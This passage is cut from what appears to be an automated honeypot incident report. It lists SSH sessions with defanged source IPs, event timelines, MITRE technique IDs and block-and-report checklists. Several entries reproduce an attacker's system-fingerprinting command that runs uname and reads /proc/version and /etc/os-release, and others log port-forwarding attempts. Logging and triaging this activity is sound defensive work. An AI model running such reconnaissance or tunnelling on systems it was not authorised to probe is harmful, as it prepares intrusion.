- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94585a85d1f9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:27 |
| **Last Seen** | 2026-08-25 05:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:27:43` | `cowrie.session.connect` |
| `2026-08-25 05:27:44` | `cowrie.client.version` |
| `2026-08-25 05:27:44` | `cowrie.client.kex` |
| `2026-08-25 05:27:45` | `cowrie.login.success` |
| `2026-08-25 05:27:47` | `cowrie.session.params` |
| `2026-08-25 05:27:47` | `cowrie.command.input` |
| `2026-08-25 05:27:47` | `cowrie.command.input` |
| `2026-08-25 05:27:47` | `cowrie.command.input` |
| `2026-08-25 05:27:47` | `cowrie.command.input` |
| `2026-08-25 05:27:47` | `cowrie.command.input` |
| `2026-08-25 05:27:47` | `cowrie.command.success` |
| `2026-08-25 05:27:47` | `cowrie.command.input` |
| `2026-08-25 05:27:47` | `cowrie.command.input` |
| `2026-08-25 05:27:47` | `cowrie.command.input` |
| `2026-08-25 05:27:47` | `cowrie.command.input` |
| `2026-08-25 05:27:47` | `cowrie.log.closed` |
| `2026-08-25 05:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd9529cf2624

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:29 |
| **Last Seen** | 2026-08-25 05:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:29:50` | `cowrie.session.connect` |
| `2026-08-25 05:29:50` | `cowrie.client.version` |
| `2026-08-25 05:29:50` | `cowrie.client.kex` |
| `2026-08-25 05:29:52` | `cowrie.login.success` |
| `2026-08-25 05:29:53` | `cowrie.session.params` |
| `2026-08-25 05:29:53` | `cowrie.command.input` |
| `2026-08-25 05:29:53` | `cowrie.command.input` |
| `2026-08-25 05:29:53` | `cowrie.command.input` |
| `2026-08-25 05:29:53` | `cowrie.command.input` |
| `2026-08-25 05:29:53` | `cowrie.command.input` |
| `2026-08-25 05:29:53` | `cowrie.command.success` |
| `2026-08-25 05:29:53` | `cowrie.command.input` |
| `2026-08-25 05:29:53` | `cowrie.command.input` |
| `2026-08-25 05:29:53` | `cowrie.command.input` |
| `2026-08-25 05:29:53` | `cowrie.command.input` |
| `2026-08-25 05:29:53` | `cowrie.log.closed` |
| `2026-08-25 05:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55692fab0ac1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:31 |
| **Last Seen** | 2026-08-25 05:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:31:59` | `cowrie.session.connect` |
| `2026-08-25 05:32:00` | `cowrie.client.version` |
| `2026-08-25 05:32:00` | `cowrie.client.kex` |
| `2026-08-25 05:32:01` | `cowrie.login.success` |
| `2026-08-25 05:32:03` | `cowrie.session.params` |
| `2026-08-25 05:32:03` | `cowrie.command.input` |
| `2026-08-25 05:32:03` | `cowrie.command.input` |
| `2026-08-25 05:32:03` | `cowrie.command.input` |
| `2026-08-25 05:32:03` | `cowrie.command.input` |
| `2026-08-25 05:32:03` | `cowrie.command.input` |
| `2026-08-25 05:32:03` | `cowrie.command.success` |
| `2026-08-25 05:32:03` | `cowrie.command.input` |
| `2026-08-25 05:32:03` | `cowrie.command.input` |
| `2026-08-25 05:32:03` | `cowrie.command.input` |
| `2026-08-25 05:32:03` | `cowrie.command.input` |
| `2026-08-25 05:32:03` | `cowrie.log.closed` |
| `2026-08-25 05:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7044fc349f0c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:34 |
| **Last Seen** | 2026-08-25 05:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:34:09` | `cowrie.session.connect` |
| `2026-08-25 05:34:09` | `cowrie.client.version` |
| `2026-08-25 05:34:09` | `cowrie.client.kex` |
| `2026-08-25 05:34:11` | `cowrie.login.success` |
| `2026-08-25 05:34:12` | `cowrie.session.params` |
| `2026-08-25 05:34:12` | `cowrie.command.input` |
| `2026-08-25 05:34:12` | `cowrie.command.input` |
| `2026-08-25 05:34:12` | `cowrie.command.input` |
| `2026-08-25 05:34:12` | `cowrie.command.input` |
| `2026-08-25 05:34:12` | `cowrie.command.input` |
| `2026-08-25 05:34:12` | `cowrie.command.success` |
| `2026-08-25 05:34:12` | `cowrie.command.input` |
| `2026-08-25 05:34:12` | `cowrie.command.input` |
| `2026-08-25 05:34:12` | `cowrie.command.input` |
| `2026-08-25 05:34:12` | `cowrie.command.input` |
| `2026-08-25 05:34:12` | `cowrie.log.closed` |
| `2026-08-25 05:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a29cae485bb4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:35 |
| **Last Seen** | 2026-08-25 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:35:24` | `cowrie.session.connect` |
| `2026-08-25 05:35:24` | `cowrie.client.version` |
| `2026-08-25 05:35:24` | `cowrie.client.kex` |
| `2026-08-25 05:35:25` | `cowrie.login.success` |
| `2026-08-25 05:35:25` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:35:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:35:25` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2f75e7573e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:35 |
| **Last Seen** | 2026-08-25 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:35:28` | `cowrie.session.connect` |
| `2026-08-25 05:35:28` | `cowrie.client.version` |
| `2026-08-25 05:35:28` | `cowrie.client.kex` |
| `2026-08-25 05:35:29` | `cowrie.login.success` |
| `2026-08-25 05:35:29` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:35:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:35:29` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:35:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02c20f2fa8c2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:36 |
| **Last Seen** | 2026-08-25 05:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:36:25` | `cowrie.session.connect` |
| `2026-08-25 05:36:26` | `cowrie.client.version` |
| `2026-08-25 05:36:26` | `cowrie.client.kex` |
| `2026-08-25 05:36:27` | `cowrie.login.success` |
| `2026-08-25 05:36:29` | `cowrie.session.params` |
| `2026-08-25 05:36:29` | `cowrie.command.input` |
| `2026-08-25 05:36:29` | `cowrie.command.input` |
| `2026-08-25 05:36:29` | `cowrie.command.input` |
| `2026-08-25 05:36:29` | `cowrie.command.input` |
| `2026-08-25 05:36:29` | `cowrie.command.input` |
| `2026-08-25 05:36:29` | `cowrie.command.success` |
| `2026-08-25 05:36:29` | `cowrie.command.input` |
| `2026-08-25 05:36:29` | `cowrie.command.input` |
| `2026-08-25 05:36:29` | `cowrie.command.input` |
| `2026-08-25 05:36:29` | `cowrie.command.input` |
| `2026-08-25 05:36:30` | `cowrie.log.closed` |
| `2026-08-25 05:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-762e24da9172

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:38 |
| **Last Seen** | 2026-08-25 05:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:38:37` | `cowrie.session.connect` |
| `2026-08-25 05:38:37` | `cowrie.client.version` |
| `2026-08-25 05:38:37` | `cowrie.client.kex` |
| `2026-08-25 05:38:39` | `cowrie.login.success` |
| `2026-08-25 05:38:40` | `cowrie.session.params` |
| `2026-08-25 05:38:40` | `cowrie.command.input` |
| `2026-08-25 05:38:40` | `cowrie.command.input` |
| `2026-08-25 05:38:40` | `cowrie.command.input` |
| `2026-08-25 05:38:40` | `cowrie.command.input` |
| `2026-08-25 05:38:40` | `cowrie.command.input` |
| `2026-08-25 05:38:40` | `cowrie.command.success` |
| `2026-08-25 05:38:40` | `cowrie.command.input` |
| `2026-08-25 05:38:40` | `cowrie.command.input` |
| `2026-08-25 05:38:40` | `cowrie.command.input` |
| `2026-08-25 05:38:40` | `cowrie.command.input` |
| `2026-08-25 05:38:40` | `cowrie.log.closed` |
| `2026-08-25 05:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b97f6a2b88

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-25 05:39 |
| **Last Seen** | 2026-08-25 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:39:26` | `cowrie.session.connect` |
| `2026-08-25 05:39:26` | `cowrie.client.version` |
| `2026-08-25 05:39:26` | `cowrie.client.kex` |
| `2026-08-25 05:39:27` | `cowrie.login.success` |
| `2026-08-25 05:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50123b8f6c05

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-25 05:39 |
| **Last Seen** | 2026-08-25 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:39:27` | `cowrie.session.connect` |
| `2026-08-25 05:39:27` | `cowrie.client.version` |
| `2026-08-25 05:39:27` | `cowrie.client.kex` |
| `2026-08-25 05:39:28` | `cowrie.login.success` |
| `2026-08-25 05:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe88b4d87d02

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:40 |
| **Last Seen** | 2026-08-25 05:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:40:48` | `cowrie.session.connect` |
| `2026-08-25 05:40:48` | `cowrie.client.version` |
| `2026-08-25 05:40:48` | `cowrie.client.kex` |
| `2026-08-25 05:40:50` | `cowrie.login.success` |
| `2026-08-25 05:40:51` | `cowrie.session.params` |
| `2026-08-25 05:40:51` | `cowrie.command.input` |
| `2026-08-25 05:40:51` | `cowrie.command.input` |
| `2026-08-25 05:40:51` | `cowrie.command.input` |
| `2026-08-25 05:40:51` | `cowrie.command.input` |
| `2026-08-25 05:40:51` | `cowrie.command.input` |
| `2026-08-25 05:40:51` | `cowrie.command.success` |
| `2026-08-25 05:40:51` | `cowrie.command.input` |
| `2026-08-25 05:40:51` | `cowrie.command.input` |
| `2026-08-25 05:40:51` | `cowrie.command.input` |
| `2026-08-25 05:40:51` | `cowrie.command.input` |
| `2026-08-25 05:40:52` | `cowrie.log.closed` |
| `2026-08-25 05:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-178d362f9303

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:42 |
| **Last Seen** | 2026-08-25 05:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:42:55` | `cowrie.session.connect` |
| `2026-08-25 05:42:55` | `cowrie.client.version` |
| `2026-08-25 05:42:55` | `cowrie.client.kex` |
| `2026-08-25 05:42:57` | `cowrie.login.success` |
| `2026-08-25 05:42:58` | `cowrie.session.params` |
| `2026-08-25 05:42:58` | `cowrie.command.input` |
| `2026-08-25 05:42:58` | `cowrie.command.input` |
| `2026-08-25 05:42:58` | `cowrie.command.input` |
| `2026-08-25 05:42:58` | `cowrie.command.input` |
| `2026-08-25 05:42:58` | `cowrie.command.input` |
| `2026-08-25 05:42:58` | `cowrie.command.success` |
| `2026-08-25 05:42:58` | `cowrie.command.input` |
| `2026-08-25 05:42:58` | `cowrie.command.input` |
| `2026-08-25 05:42:58` | `cowrie.command.input` |
| `2026-08-25 05:42:58` | `cowrie.command.input` |
| `2026-08-25 05:42:58` | `cowrie.log.closed` |
| `2026-08-25 05:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26e790fe968

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:44 |
| **Last Seen** | 2026-08-25 05:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:44:56` | `cowrie.session.connect` |
| `2026-08-25 05:44:56` | `cowrie.client.version` |
| `2026-08-25 05:44:56` | `cowrie.client.kex` |
| `2026-08-25 05:44:58` | `cowrie.login.success` |
| `2026-08-25 05:44:59` | `cowrie.session.params` |
| `2026-08-25 05:44:59` | `cowrie.command.input` |
| `2026-08-25 05:44:59` | `cowrie.command.input` |
| `2026-08-25 05:44:59` | `cowrie.command.input` |
| `2026-08-25 05:44:59` | `cowrie.command.input` |
| `2026-08-25 05:44:59` | `cowrie.command.input` |
| `2026-08-25 05:44:59` | `cowrie.command.success` |
| `2026-08-25 05:44:59` | `cowrie.command.input` |
| `2026-08-25 05:44:59` | `cowrie.command.input` |
| `2026-08-25 05:44:59` | `cowrie.command.input` |
| `2026-08-25 05:44:59` | `cowrie.command.input` |
| `2026-08-25 05:45:00` | `cowrie.log.closed` |
| `2026-08-25 05:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67d8b321a8f5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:45 |
| **Last Seen** | 2026-08-25 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:45:05` | `cowrie.session.connect` |
| `2026-08-25 05:45:05` | `cowrie.client.version` |
| `2026-08-25 05:45:05` | `cowrie.client.kex` |
| `2026-08-25 05:45:06` | `cowrie.login.success` |
| `2026-08-25 05:45:06` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:45:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:45:06` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d86131dc16e2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:45 |
| **Last Seen** | 2026-08-25 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:45:08` | `cowrie.session.connect` |
| `2026-08-25 05:45:08` | `cowrie.client.version` |
| `2026-08-25 05:45:08` | `cowrie.client.kex` |
| `2026-08-25 05:45:09` | `cowrie.login.success` |
| `2026-08-25 05:45:09` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:45:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:45:10` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505b147c6c01

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:47 |
| **Last Seen** | 2026-08-25 05:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
